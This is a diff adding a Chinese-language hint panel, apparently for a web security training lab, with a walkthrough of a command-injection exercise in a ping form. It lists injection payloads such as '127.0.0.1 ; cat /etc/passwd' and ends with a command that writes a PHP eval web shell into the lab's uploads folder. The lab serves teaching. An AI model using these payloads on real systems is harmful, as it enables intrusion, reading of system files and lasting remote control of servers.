@@ -1,0 +1,26 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>命令执行的核心是输入的 IP 被直接拼进了系统命令（ping）。思路：用命令拼接符把自己的命令接在后面。Windows 用 <code>&amp;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code>；Linux 用 <code>;</code>、<code>&amp;&amp;</code>、<code>|</code>、<code>||</code>。先跑个简单的 <code>whoami</code> 确认能执行，再尝试读文件、写 WebShell。注意在输入框里填 <code>&amp;</code> 即可，浏览器会自动 URL 编码。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>命令拼接符：</b><br>
+Windows：<code>&amp;</code> 依次执行 &nbsp; <code>&amp;&amp;</code> 前成功才执行 &nbsp; <code>|</code> 管道 &nbsp; <code>||</code> 前失败才执行<br>
+Linux：<code>;</code> 依次执行 &nbsp; <code>&amp;&amp;</code> 前成功才执行 &nbsp; <code>|</code> 管道 &nbsp; <code>||</code> 前失败才执行 &nbsp; <code>&amp;</code> 后台执行<br>
+<b>通用 payload（Windows + Linux 均生效）：</b><br>
+在页面输入框中填写 <code>127.0.0.1 &amp; whoami</code>（浏览器会自动把 <code>&amp;</code> 编码为 <code>%26</code>，服务器解码后即为命令拼接符 <code>&amp;</code>）<br>
+<b>Windows 示例（在输入框内填写）：</b><br>
+<code>127.0.0.1 &amp; ipconfig</code><br>
+<code>127.0.0.1&amp;calc</code><br>
+<code>127.0.0.1 &amp; type C:\\Windows\\win.ini</code><br>
+<b>Linux 示例（在输入框内填写）：</b><br>
+<code>127.0.0.1 ; id</code><br>
+<code>127.0.0.1 ; cat /etc/passwd</code><br>
+<b>地址栏直接输入（需手动 URL 编码）：</b><br>
+<code>?ip=127.0.0.1%20%26%20whoami</code><br>
+注意：不要在输入框里填 <code>%26</code>，否则会被二次编码为 <code>%2526</code>，ping 会报"错误的参数 %26"。
+<b>写 WebShell（以 Linux 为例，Windows 把路径换成 uploads 绝对路径即可）：</b><br>
+<code>?ip=127.0.0.1 ; echo '&lt;?php @eval($_POST["cmd"]);?&gt;' > /var/www/html/bafanglab/uploads/shell.php</code><br>
+</div>
+</details>
